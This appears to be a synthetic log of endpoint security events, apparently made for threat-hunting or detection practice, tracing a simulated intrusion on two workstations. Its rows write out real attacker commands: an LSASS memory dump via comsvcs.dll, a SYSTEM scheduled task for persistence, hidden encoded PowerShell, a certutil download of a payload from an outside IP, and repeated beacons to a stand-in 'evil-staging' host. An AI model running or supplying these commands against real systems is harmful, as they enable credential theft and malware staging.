Timestamp,DeviceName,ActionType,FileName,FolderPath,ProcessCommandLine,SHA256,AccountName,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessId,InitiatingProcessAccountName,ProcessId,RemoteIP,RemoteUrl,RemotePort,ReportId
2026-05-15T09:37:50Z,WS-FINANCE-04,FileCreated,out.bin,C:\Users\jdoe\AppData\Local\Temp,"rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 716 C:\Users\jdoe\AppData\Local\Temp\out.bin full",C1D2E3F4A5B6C1D2E3F4A5B6C1D2E3F4A5B6C1D2E3F4A5B6C1D2E3F4A5B6C1D2,jdoe,rundll32.exe,"rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 716 C:\Users\jdoe\AppData\Local\Temp\out.bin full",11003,jdoe,11003,,,,1011
2026-05-15T09:40:12Z,WS-FINANCE-04,ProcessCreated,schtasks.exe,C:\Windows\System32,"schtasks.exe /create /tn ""UpdateWindowsCheck"" /tr ""C:\Users\jdoe\AppData\Local\Temp\s2.ps1"" /sc onlogon /ru SYSTEM",D3E4F5A6B7C8D3E4F5A6B7C8D3E4F5A6B7C8D3E4F5A6B7C8D3E4F5A6B7C8D3E4,jdoe,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,9112,jdoe,12114,,,,1012
2026-05-15T09:42:33Z,WS-FINANCE-04,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jdoe,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,9112,jdoe,9112,198.51.100.42,evil-staging.example,443,1013
2026-05-15T09:45:08Z,WS-FINANCE-04,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jdoe,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,9112,jdoe,9112,198.51.100.42,evil-staging.example,443,1014
2026-05-15T09:48:17Z,WS-FINANCE-04,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jdoe,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,9112,jdoe,9112,198.51.100.42,evil-staging.example,443,1015
2026-05-15T09:51:42Z,WS-FINANCE-04,ProcessCreated,certutil.exe,C:\Windows\System32,"certutil.exe -urlcache -split -f https://203.0.113.55/stage2.exe C:\Users\jdoe\AppData\Local\Temp\update.exe",E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6,jdoe,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,9112,jdoe,13201,,,,1016
2026-05-15T09:51:55Z,WS-FINANCE-04,NetworkConnectionEvents,certutil.exe,C:\Windows\System32,"certutil.exe -urlcache -split -f https://203.0.113.55/stage2.exe C:\Users\jdoe\AppData\Local\Temp\update.exe",E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6,jdoe,certutil.exe,"certutil.exe -urlcache -split -f https://203.0.113.55/stage2.exe C:\Users\jdoe\AppData\Local\Temp\update.exe",13201,jdoe,13201,203.0.113.55,,443,1017
2026-05-15T09:52:18Z,WS-FINANCE-04,FileCreated,update.exe,C:\Users\jdoe\AppData\Local\Temp,"certutil.exe -urlcache -split -f https://203.0.113.55/stage2.exe C:\Users\jdoe\AppData\Local\Temp\update.exe",F7A8B9C0D1E2F7A8B9C0D1E2F7A8B9C0D1E2F7A8B9C0D1E2F7A8B9C0D1E2F7A8,jdoe,certutil.exe,"certutil.exe -urlcache -split -f https://203.0.113.55/stage2.exe C:\Users\jdoe\AppData\Local\Temp\update.exe",13201,jdoe,13201,,,,1018
2026-05-15T09:55:04Z,WS-FINANCE-04,ProcessCreated,update.exe,C:\Users\jdoe\AppData\Local\Temp,update.exe,F7A8B9C0D1E2F7A8B9C0D1E2F7A8B9C0D1E2F7A8B9C0D1E2F7A8B9C0D1E2F7A8,jdoe,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,9112,jdoe,14002,,,,1019
2026-05-15T10:02:21Z,WS-FINANCE-04,ProcessCreated,svchost.exe,C:\Windows\System32,svchost.exe -k LocalServiceNetworkRestricted,A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2,SYSTEM,services.exe,C:\Windows\System32\services.exe,612,SYSTEM,4501,,,,1020
2026-05-15T10:08:45Z,WS-LEGAL-12,ProcessCreated,WINWORD.EXE,C:\Program Files\Microsoft Office\root\Office16,"WINWORD.EXE /n ""C:\Users\smith\Downloads\Contract.docm""",B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8,smith,explorer.exe,C:\Windows\explorer.exe,2118,smith,5512,,,,1021
2026-05-15T10:09:22Z,WS-LEGAL-12,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,"powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0",C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,smith,WINWORD.EXE,"WINWORD.EXE /n ""C:\Users\smith\Downloads\Contract.docm""",5512,smith,6018,,,,1022
2026-05-15T10:10:14Z,WS-LEGAL-12,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,smith,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0,6018,smith,6018,198.51.100.42,evil-staging.example,443,1023
